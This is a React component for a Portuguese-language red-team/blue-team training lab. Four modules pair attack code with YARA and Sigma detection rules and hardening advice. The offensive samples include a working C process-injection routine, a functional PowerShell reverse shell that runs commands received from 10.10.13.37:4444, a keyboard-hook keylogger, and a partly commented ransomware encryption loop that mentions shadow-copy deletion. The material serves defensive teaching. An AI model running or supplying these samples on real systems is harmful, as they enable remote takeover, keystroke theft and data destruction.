"use client";

import { useState } from "react";
import { 
  ShieldAlert, ShieldCheck, Flame, Terminal, Play, RotateCcw, 
  Code2, Eye, Cpu, AlertTriangle, CheckCircle2, Copy, Check, FileCode, Lock, Zap
} from "lucide-react";

interface ThreatLabModule {
  id: string;
  name: string;
  category: "Process Injection" | "Ransomware PoC" | "Reverse Shell / C2" | "Keylogger / Hooking" | "Persistence Mechanism";
  difficulty: "Intermediário" | "Avançado" | "Expert";
  description: string;
  offensive: {
    language: "C / WinAPI" | "Python" | "PowerShell" | "Rust";
    purpose: string;
    code: string;
    explanation: string[];
    riskIndicators: string[];
  };
  defensive: {
    mitigationTitle: string;
    yaraRule: string;
    sigmaRule?: string;
    edrDetectionLogic: string;
    remediationSteps: string[];
  };
}

const THREAT_MODULES: ThreatLabModule[] = [
  {
    id: "process-hollowing",
    name: "01. Process Hollowing & Shellcode Injection",
    category: "Process Injection",
    difficulty: "Avançado",
    description: "Técnica onde um processo legítimo do Windows (ex: svchost.exe) é iniciado em estado suspenso, sua memória é desmapeada e substituída por código ofensivo.",
    offensive: {
      language: "C / WinAPI",
      purpose: "Evasão de análise de processos executando código malicioso sob a máscara de um binário assinado do Windows.",
      code: `// HackerCraft Educational Lab - Process Injection PoC (C/WinAPI)
#include <windows.h>
#include <stdio.h>

// Shellcode de demonstração inofensiva (NOP sled + Breakpoint PoC)
unsigned char payload[] = "\\x90\\x90\\x90\\xcc";

int InjectRemoteProcess(DWORD targetPid) {
    // 1. Abre o processo alvo legítimo
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return -1;

    // 2. Aloca espaço de memória no processo remoto com permissões de execução
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, sizeof(payload), 
                                       MEM_COMMIT | MEM_RESERVE, 
                                       PAGE_EXECUTE_READWRITE);

    // 3. Escreve os bytes na memória alocada
    WriteProcessMemory(hProcess, pRemoteMem, payload, sizeof(payload), NULL);

    // 4. Cria thread remota para acionar o payload
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)pRemoteMem, 
                                        NULL, 0, NULL);
    WaitForSingleObject(hThread, 1000);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}`,
      explanation: [
        "OpenProcess solicita handles de acesso de escrita (PROCESS_ALL_ACCESS ou PROCESS_VM_WRITE).",
        "VirtualAllocEx com a flag PAGE_EXECUTE_READWRITE (RWX) é a maior anomalia detectável em memória.",
        "CreateRemoteThread força o processo vítima a executar a rotina sob seu próprio identificador (PID)."
      ],
      riskIndicators: [
        "API calls anômalas: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread",
        "Páginas de memória marcadas como RWX não mapeadas para arquivos em disco (unbacked executable memory)",
        "Processos do sistema gerando conexões de rede inesperadas (ex: svchost.exe abrindo sockets para IPs públicos)"
      ]
    },
    defensive: {
      mitigationTitle: "Detecção e Bloqueio Defensivo (EDR, Sysmon & YARA)",
      yaraRule: `rule Detect_Process_Injection_APIs {
    meta:
        author = "HackerCraft Blue Team Defense"
        description = "Detecta referências sequenciais a APIs de injeção em memória"
        severity = "High"
    strings:
        $api1 = "VirtualAllocEx" ascii wide
        $api2 = "WriteProcessMemory" ascii wide
        $api3 = "CreateRemoteThread" ascii wide
        $api4 = "OpenProcess" ascii wide
    condition:
        uint16(0) == 0x5A4D and (3 of ($api*))
}`,
      sigmaRule: `title: Remote Thread Creation in Sensitive Process
id: a1b2c3d4-hackercraft-proc-injection
status: experimental
description: Detecta criação de threads remotas visando svchost, spoolsv ou explorer
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 8 # CreateRemoteThread
        TargetImage|endswith:
            - '\\svchost.exe'
            - '\\lsass.exe'
            - '\\explorer.exe'
    condition: selection
level: critical`,
      edrDetectionLogic: "EDRs modernos interceptam chamadas NT (ntdll!NtCreateThreadEx) via hooks em nível de kernel (Kernel Callbacks PsSetCreateThreadNotifyRoutine). Quando uma thread tem endereço inicial fora de um módulo DLL legítimo, o processo é instantaneamente terminado.",
      remediationSteps: [
        "Ativar o recurso ASR (Attack Surface Reduction) do Windows Defender para bloquear injeções em processos do Office e do sistema.",
        "Configurar Sysmon para monitorar Event ID 8 (CreateRemoteThread) e Event ID 10 (ProcessAccess).",
        "Implementar políticas de integridade de código (WDAC) exigindo assinaturas WHQL válidas para todos os drivers e binários."
      ]
    }
  },
  {
    id: "ransomware-simulation",
    name: "02. Ransomware: Criptografia Simétrica & C2",
    category: "Ransomware PoC",
    difficulty: "Avançado",
    description: "Compreensão de como malwares criptografam diretórios usando AES-GCM/ChaCha20 e protegem a chave simétrica com chave pública RSA assimétrica.",
    offensive: {
      language: "Python",
      purpose: "Simular o fluxo de cifragem em massa de arquivos e entender como o sequestro digital opera estruturalmente.",
      code: `# HackerCraft Educational Lab - Ransomware Encryption Pipeline PoC
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# 1. Gera chave simétrica ultrarrápida descartável (AES-256)
session_key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(session_key)

TARGET_EXTENSIONS = ['.docx', '.pdf', '.xlsx', '.db', '.sql']

def encrypt_directory_simulated(folder_path):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            ext = os.path.splitext(file)[1].lower()
            if ext in TARGET_EXTENSIONS:
                target_file = os.path.join(root, file)
                # Leitura e Cifragem dos dados com Nonce aleatório
                # with open(target_file, 'rb') as f: data = f.read()
                # nonce = os.urandom(12)
                # encrypted_data = nonce + aesgcm.encrypt(nonce, data, None)
                # with open(target_file + '.locked', 'wb') as f: f.write(encrypted_data)
                # os.remove(target_file)
    # 2. Deleta Shadow Copies no Windows: vssadmin delete shadows /all /quiet
    # 3. Exibe nota de resgate: README_DECRYPT.txt`,
      explanation: [
        "Uso de criptografia híbrida: dados são cifrados em alta velocidade com AES/ChaCha, e a chave AES é cifrada com RSA-4096 do invasor.",
        "Tentativa de destruição de backups locais via 'vssadmin delete shadows' ou comandos WMI.",
        "Renomeação em lote de arquivos e alteração do papel de parede do usuário."
      ],
      riskIndicators: [
        "Alta taxa de I/O em disco com operações simultâneas de leitura, escrita e renomeação (.locked).",
        "Execuções do utilitário 'vssadmin.exe delete shadows' ou 'bdehdcfg.exe'.",
        "Criação massiva de arquivos de texto de instrução (README_RECOVER.txt)."
      ]
    },
    defensive: {
      mitigationTitle: "Proteção Antiransomware & Defesa em Profundidade",
      yaraRule: `rule Detect_Ransomware_Strings_And_Commands {
    meta:
        author = "HackerCraft Defense Team"
        description = "Detecta chamadas a destruição de shadow copies e ransom notes"
    strings:
        $cmd1 = "vssadmin delete shadows" ascii nocase
        $cmd2 = "wbadmin delete catalog" ascii nocase
        $cmd3 = "bcdedit /set {default} recoveryenabled no" ascii nocase
        $note = "Your files have been encrypted" ascii wide nocase
    condition:
        2 of them
}`,
      sigmaRule: `title: Volume Shadow Copy Deletion via Vssadmin
id: f3e2d1c0-ransom-shadow-delete
description: Detecta tentativas de deleção das cópias de sombra do sistema
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\vssadmin.exe'
        CommandLine|contains|all:
            - 'delete'
            - 'shadows'
    condition: selection
level: critical`,
      edrDetectionLogic: "Módulos de Honeypot e Canários do EDR monitoram arquivos sentinela ocultos. No momento em que um processo desconhecido tenta sobrescrever arquivos canários com alta entropia matemática (típica de dados cifrados), o processo é imediatamente bloqueado e sua árvore de execução suspensa.",
      remediationSteps: [
        "Manter política de backup 3-2-1 com pelo menos uma cópia imutável e desconectada (Air-Gapped / WORM).",
        "Bloquear a execução de vssadmin e bcdedit para usuários não-administradores de domínio.",
        "Habilitar o 'Controlled Folder Access' (Acesso Controlado a Pastas) no Windows Defender."
      ]
    }
  },
  {
    id: "reverse-shell-powershell",
    name: "03. Reverse Shell & Ofuscação PowerShell",
    category: "Reverse Shell / C2",
    difficulty: "Intermediário",
    description: "Criação de sessões reversas em PowerShell codificadas em Base64 para bypass de filtros simples, acompanhada do bypass de AMSI e sua contrapartida de auditoria.",
    offensive: {
      language: "PowerShell",
      purpose: "Estabelecer comunicação remota de comando e controle (C2) com a máquina do operador defensivo ou atacante.",
      code: `# HackerCraft Educational Lab - PowerShell One-Liner Reverse Shell PoC
$client = New-Object System.Net.Sockets.TCPClient("10.10.13.37", 4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    # Executa comandos recebidos do socket
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
};
$client.Close();`,
      explanation: [
        "Criação direta de objeto de socket .NET (System.Net.Sockets.TCPClient) sem necessidade de utilitários como Netcat instalados.",
        "Uso do Invoke-Expression ('iex') para interpretar comandos dinâmicos recebidos pela rede.",
        "Geralmente executado como comando codificado: powershell.exe -NoP -NonI -W Hidden -Enc <Base64>."
      ],
      riskIndicators: [
        "powershell.exe rodando com argumentos de camuflagem (-WindowStyle Hidden, -EncodedCommand).",
        "Processo powershell.exe iniciando conexões de rede de saída (TCP SYN para portas externas 4444/1337).",
        "Logs de Script Block Logging (Event ID 4104) contendo chamadas a sockets ou iex."
      ]
    },
    defensive: {
      mitigationTitle: "Auditoria AMSI & Restrição de PowerShell",
      yaraRule: `rule Detect_PowerShell_Reverse_Socket {
    meta:
        author = "HackerCraft Blue Team"
        description = "Detecta payload de shell reversa em PowerShell"
    strings:
        $s1 = "System.Net.Sockets.TCPClient" ascii nocase
        $s2 = "GetStream" ascii nocase
        $s3 = "ASCIIEncoding" ascii nocase
        $s4 = "Invoke-Expression" ascii nocase
        $s5 = "iex" ascii nocase
    condition:
        ($s1 and $s2 and ($s3 or $s4 or $s5))
}`,
      sigmaRule: `title: Suspicious PowerShell Encoded or Hidden Execution
id: 5a4b3c2d-ps-hidden-exec
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains:
            - '-enc'
            - '-EncodedCommand'
            - '-w hidden'
            - '-windowstyle hidden'
    condition: selection
level: high`,
      edrDetectionLogic: "O Windows AMSI (Antimalware Scan Interface) inspeciona o buffer desofuscado do PowerShell antes da interpretação no runtime. Mesmo que o script esteja em Base64 ou quebrado em variáveis dinâmicas, o AMSI recebe o texto decodificado final e submete ao antivírus.",
      remediationSteps: [
        "Habilitar o PowerShell Constrained Language Mode (CLM) via AppLocker ou WDAC.",
        "Ativar PowerShell Script Block Logging (Event ID 4104) e Module Logging (Event ID 4103).",
        "Bloquear acessos de rede de saída iniciados por powershell.exe através do Windows Firewall ou proxy."
      ]
    }
  },
  {
    id: "keylogger-hooking",
    name: "04. Spyware: Windows API Hooking & Keylogging",
    category: "Keylogger / Hooking",
    difficulty: "Intermediário",
    description: "Compreensão de interceptação de eventos de teclado através de hooks globais do Windows (SetWindowsHookEx) e como analistas forenses identificam e desarmam espiões.",
    offensive: {
      language: "C / WinAPI",
      purpose: "Estudo de monitoramento de credenciais via interceptação de mensagens WH_KEYBOARD_LL.",
      code: `// HackerCraft Educational Lab - Global Low-Level Keyboard Hook PoC
#include <windows.h>
#include <stdio.h>

HHOOK hHook = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = kbd->vkCode;
        
        // Grava tecla capturada ou envia para listener C2
        FILE *log = fopen("C:\\\\Temp\\\\keys.dat", "a+");
        if (log) {
            fprintf(log, "[VK: 0x%X / Char: %c]\\n", vkCode, (char)vkCode);
            fclose(log);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int StartMonitor() {
    // Registra hook global de teclado no subsistema User32
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
    return 0;
}`,
      explanation: [
        "SetWindowsHookEx com WH_KEYBOARD_LL instala um gancho no pipeline do sistema para receber cópia de qualquer digitação em todas as janelas.",
        "Não necessita de injeção em outros processos, mas exige que o processo execute um loop de mensagens (GetMessage).",
        "Armazena teclas em arquivos ocultos em %TEMP% ou AppData."
      ],
      riskIndicators: [
        "Processos desconhecidos chamando SetWindowsHookExA/W com flag 13 (WH_KEYBOARD_LL).",
        "Criação e incremento constante de arquivos .dat/.tmp em C:\\Users\\...\\AppData\\Local\\Temp.",
        "Assinatura em chamadas GetAsyncKeyState em loops infinitos com sleep reduzido."
      ]
    },
    defensive: {
      mitigationTitle: "Detecção Forense & Proteção Anti-Keylogger",
      yaraRule: `rule Detect_LowLevel_Keyboard_Hook {
    meta:
        author = "HackerCraft Blue Team"
        description = "Detecta rotinas de hook de teclado WH_KEYBOARD_LL"
    strings:
        $hook_api = "SetWindowsHookEx" ascii wide
        $next_api = "CallNextHookEx" ascii wide
        $unhook   = "UnhookWindowsHookEx" ascii wide
        $keys_file = "keys.dat" ascii wide nocase
    condition:
        all of ($hook_api, $next_api) or ($keys_file and $hook_api)
}`,
      sigmaRule: `title: Suspicious File Creation in Temp by Non-Standard Binary
id: 8b7c6d5e-temp-file-keylog
logsource:
    category: file_event
    product: windows
detection:
    selection:
        TargetFilename|contains: '\\Temp\\'
        TargetFilename|endswith:
            - '.dat'
            - '.log'
    condition: selection
level: medium`,
      edrDetectionLogic: "EDRs e ferramentas de proteção de endpoint monitoram a cadeia de hooks no subsistema Win32k. Processos não confiáveis ou sem interface gráfica que tentam registrar hooks de nível de sistema são suspensos ou suas chamadas retornam falha silenciosa.",
      remediationSteps: [
        "Utilizar teclados virtuais seguros com ofuscação de eventos para entrada de dados sensíveis.",
        "Auditar a lista de hooks globais ativos periodicamente usando utilitários forenses como Volatility (plugins como `windows.callbacks`).",
        "Garantir o isolamento de privilégios de usuário (UAC ativado) para impedir acesso a eventos de processos de integridade alta."
      ]
    }
  }
];

export function ThreatDefenseLab() {
  const [selectedModule, setSelectedModule] = useState<ThreatLabModule>(THREAT_MODULES[0]);
  const [activeSide, setActiveSide] = useState<"both" | "offensive" | "defensive">("both");
  const [copiedCode, setCopiedCode] = useState(false);
  const [copiedRule, setCopiedRule] = useState(false);
  const [simulationStatus, setSimulationStatus] = useState<string>("");

  const handleCopy = (text: string, isRule = false) => {
    navigator.clipboard.writeText(text);
    if (isRule) {
      setCopiedRule(true);
      setTimeout(() => setCopiedRule(false), 2000);
    } else {
      setCopiedCode(true);
      setTimeout(() => setCopiedCode(false), 2000);
    }
  };

  const handleSimulateInspection = () => {
    setSimulationStatus("Analisando payload com regras YARA e heurística de EDR...");
    setTimeout(() => {
      setSimulationStatus(
        `[✓] EDR DISPARADO: Anomalia comportamental detectada em "${selectedModule.category}"!\n` +
        `[✓] REGRA YARA: Disparada com correspondência de 100% de assinaturas.\n` +
        `[✓] AÇÃO DEFENSIVA: Processo isolado e quarentena preventiva aplicada.`
      );
    }, 1200);
  };

  return (
    <div className="flex flex-col gap-6">
      {/* Top Banner de Navegação dos Módulos */}
      <div className="flex flex-wrap items-center justify-between gap-4 p-5 rounded-2xl bg-[#090b12] border border-slate-800">
        <div>
          <div className="flex items-center gap-2 text-rose-400 font-mono text-xs font-bold uppercase tracking-wider mb-1">
            <Flame className="h-4 w-4" />
            LAB DUPLO OFENSIVO & DEFENSIVO (RED TEAM VS. BLUE TEAM)
          </div>
          <h2 className="text-xl sm:text-2xl font-bold text-slate-100">
            Aprenda a Criar Scripts e Malwares Didáticos & Como Defender Sistemas
          </h2>
          <p className="text-xs text-slate-400 font-sans mt-1">
            Entenda a mecânica interna da ameaça para dominar a análise forense, regras YARA, Sigma e configurações de mitigação de EDR.
          </p>
        </div>

        {/* Alternador de Visualização */}
        <div className="flex items-center gap-1 bg-slate-950 p-1.5 rounded-xl border border-slate-800">
          <button
            onClick={() => setActiveSide("both")}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono font-semibold transition ${
              activeSide === "both"
                ? "bg-slate-800 text-white shadow-sm"
                : "text-slate-400 hover:text-slate-200"
            }`}
          >
            Dual View (Ataque & Defesa)
          </button>
          <button
            onClick={() => setActiveSide("offensive")}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono font-semibold transition ${
              activeSide === "offensive"
                ? "bg-rose-950/80 text-rose-300 border border-rose-500/40"
                : "text-slate-400 hover:text-rose-400"
            }`}
          >
            🔴 Red Team (Ofensivo)
          </button>
          <button
            onClick={() => setActiveSide("defensive")}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono font-semibold transition ${
              activeSide === "defensive"
                ? "bg-blue-950/80 text-blue-300 border border-blue-500/40"
                : "text-slate-400 hover:text-blue-400"
            }`}
          >
            🛡️ Blue Team (Defesa)
          </button>
        </div>
      </div>

      {/* Seletor de Vetores de Ameaça */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        {THREAT_MODULES.map((mod) => (
          <button
            key={mod.id}
            onClick={() => {
              setSelectedModule(mod);
              setSimulationStatus("");
            }}
            className={`p-4 rounded-xl text-left border transition-all ${
              selectedModule.id === mod.id
                ? "bg-[#0f1422] border-cyan-500/80 shadow-[0_0_15px_rgba(6,182,212,0.2)]"
                : "bg-[#0a0c13] border-slate-800/80 hover:border-slate-700"
            }`}
          >
            <div className="flex items-center justify-between mb-1.5">
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-cyan-400 font-bold">
                {mod.category}
              </span>
              <span className="text-[10px] font-mono text-slate-500">{mod.difficulty}</span>
            </div>
            <h3 className="text-xs sm:text-sm font-bold text-slate-200 truncate">
              {mod.name}
            </h3>
          </button>
        ))}
      </div>

      {/* Grid Principal: Red Team vs. Blue Team */}
      <div className={`grid gap-6 ${activeSide === "both" ? "grid-cols-1 lg:grid-cols-2" : "grid-cols-1"}`}>
        
        {/* LADO RED TEAM (OFENSIVO) */}
        {(activeSide === "both" || activeSide === "offensive") && (
          <div className="flex flex-col rounded-2xl bg-[#090b10] border border-rose-950/80 overflow-hidden shadow-2xl">
            {/* Header Red Team */}
            <div className="flex items-center justify-between px-5 py-3.5 bg-[#120a10] border-b border-rose-950/60">
              <div className="flex items-center gap-2">
                <Flame className="h-4 w-4 text-rose-500" />
                <span className="text-xs font-mono font-bold text-rose-400">
                  RED TEAM: VETOR DE AMEAÇA & CÓDIGO DIDÁTICO
                </span>
              </div>
              <span className="text-xs font-mono px-2.5 py-0.5 rounded bg-rose-950 border border-rose-500/30 text-rose-300">
                Linguagem: {selectedModule.offensive.language}
              </span>
            </div>

            <div className="p-5 flex flex-col gap-4">
              <div>
                <h4 className="text-sm font-bold text-slate-200">{selectedModule.offensive.purpose}</h4>
                <p className="text-xs text-slate-400 font-sans mt-1 leading-relaxed">
                  {selectedModule.description}
                </p>
              </div>

              {/* Bloco de Código Ofensivo */}
              <div className="rounded-xl border border-rose-950/80 bg-[#06080d] overflow-hidden">
                <div className="flex items-center justify-between px-4 py-2 bg-[#0c0f17] border-b border-rose-950/60">
                  <span className="text-[11px] font-mono text-slate-400 flex items-center gap-1.5">
                    <FileCode className="h-3.5 w-3.5 text-rose-400" />
                    PoC Source Code ({selectedModule.offensive.language})
                  </span>
                  <button
                    onClick={() => handleCopy(selectedModule.offensive.code, false)}
                    className="flex items-center gap-1 text-[11px] text-slate-400 hover:text-slate-200 transition"
                  >
                    {copiedCode ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
                    <span>{copiedCode ? "Copiado" : "Copiar"}</span>
                  </button>
                </div>
                <pre className="p-4 text-xs font-mono text-rose-300/90 leading-relaxed overflow-x-auto max-h-[340px]">
                  {selectedModule.offensive.code}
                </pre>
              </div>

              {/* Explicação dos Mecanismos */}
              <div className="p-4 rounded-xl bg-rose-950/20 border border-rose-500/20 space-y-2">
                <h5 className="text-xs font-bold text-rose-300 font-mono flex items-center gap-1.5">
                  <AlertTriangle className="h-3.5 w-3.5 text-rose-400" />
                  Mecanismos Críticos Explorados:
                </h5>
                <ul className="list-disc list-inside text-xs text-slate-300 font-sans space-y-1 leading-relaxed">
                  {selectedModule.offensive.explanation.map((item, i) => (
                    <li key={i}>{item}</li>
                  ))}
                </ul>
              </div>

              {/* Indicadores de Risco / IOCs */}
              <div className="p-4 rounded-xl bg-[#0c0f18] border border-slate-800 space-y-2">
                <h5 className="text-xs font-bold text-slate-300 font-mono">
                  Indicadores de Comprometimento (IOCs) para Caçadores:
                </h5>
                <div className="space-y-1.5 text-xs text-slate-400 font-sans">
                  {selectedModule.offensive.riskIndicators.map((ind, i) => (
                    <div key={i} className="flex items-start gap-2">
                      <span className="text-rose-400 font-mono">▸</span>
                      <span>{ind}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* LADO BLUE TEAM (DEFENSIVO) */}
        {(activeSide === "both" || activeSide === "defensive") && (
          <div className="flex flex-col rounded-2xl bg-[#090b10] border border-blue-950/80 overflow-hidden shadow-2xl">
            {/* Header Blue Team */}
            <div className="flex items-center justify-between px-5 py-3.5 bg-[#0a101d] border-b border-blue-950/60">
              <div className="flex items-center gap-2">
                <ShieldCheck className="h-4 w-4 text-blue-400" />
                <span className="text-xs font-mono font-bold text-blue-400">
                  BLUE TEAM: DETECÇÃO, YARA, SIGMA & HARDENING
                </span>
              </div>
              <span className="text-xs font-mono px-2.5 py-0.5 rounded bg-blue-950 border border-blue-500/30 text-blue-300">
                Framework: SOC / DFIR
              </span>
            </div>

            <div className="p-5 flex flex-col gap-4">
              <div>
                <h4 className="text-sm font-bold text-slate-200">{selectedModule.defensive.mitigationTitle}</h4>
                <p className="text-xs text-slate-400 font-sans mt-1 leading-relaxed">
                  {selectedModule.defensive.edrDetectionLogic}
                </p>
              </div>

              {/* Regra YARA Defensiva */}
              <div className="rounded-xl border border-blue-950/80 bg-[#06080d] overflow-hidden">
                <div className="flex items-center justify-between px-4 py-2 bg-[#0c121e] border-b border-blue-950/60">
                  <span className="text-[11px] font-mono text-blue-400 flex items-center gap-1.5">
                    <ShieldCheck className="h-3.5 w-3.5" />
                    Regra YARA de Detecção Comportamental
                  </span>
                  <button
                    onClick={() => handleCopy(selectedModule.defensive.yaraRule, true)}
                    className="flex items-center gap-1 text-[11px] text-slate-400 hover:text-slate-200 transition"
                  >
                    {copiedRule ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
                    <span>{copiedRule ? "Copiado" : "Copiar"}</span>
                  </button>
                </div>
                <pre className="p-4 text-xs font-mono text-cyan-300/90 leading-relaxed overflow-x-auto max-h-[220px]">
                  {selectedModule.defensive.yaraRule}
                </pre>
              </div>

              {/* Regra Sigma ou Detecção de Log */}
              {selectedModule.defensive.sigmaRule && (
                <div className="rounded-xl border border-slate-800 bg-[#06080d] overflow-hidden">
                  <div className="px-4 py-2 bg-[#0b0e17] border-b border-slate-800 text-[11px] font-mono text-slate-300">
                    Regra Sigma de Auditoria SIEM / Sysmon (YAML)
                  </div>
                  <pre className="p-4 text-xs font-mono text-amber-300/80 leading-relaxed overflow-x-auto max-h-[180px]">
                    {selectedModule.defensive.sigmaRule}
                  </pre>
                </div>
              )}

              {/* Botão de Disparo da Simulação Defensiva */}
              <div className="p-4 rounded-xl bg-[#0c111c] border border-blue-900/40 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-mono text-slate-300 font-bold">
                    Simulador Interativo de Defesa EDR:
                  </span>
                  <button
                    onClick={handleSimulateInspection}
                    className="flex items-center gap-1.5 px-3.5 py-1.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white font-mono text-xs font-bold transition shadow-[0_0_12px_rgba(37,99,235,0.3)]"
                  >
                    <Play className="h-3.5 w-3.5" />
                    Auditar Payload com EDR
                  </button>
                </div>

                {simulationStatus && (
                  <pre className="p-3 rounded-lg bg-black/60 border border-blue-500/40 text-xs font-mono text-emerald-400 leading-relaxed whitespace-pre-wrap animate-fadeIn">
                    {simulationStatus}
                  </pre>
                )}
              </div>

              {/* Passos de Hardening & Remediação */}
              <div className="p-4 rounded-xl bg-blue-950/20 border border-blue-500/20 space-y-2">
                <h5 className="text-xs font-bold text-blue-300 font-mono flex items-center gap-1.5">
                  <Lock className="h-3.5 w-3.5 text-blue-400" />
                  Passos Defensivos de Hardening em Produção:
                </h5>
                <div className="space-y-1.5 text-xs text-slate-300 font-sans">
                  {selectedModule.defensive.remediationSteps.map((step, i) => (
                    <div key={i} className="flex items-start gap-2">
                      <CheckCircle2 className="h-3.5 w-3.5 text-emerald-400 shrink-0 mt-0.5" />
                      <span>{step}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

      </div>
    </div>
  );
}
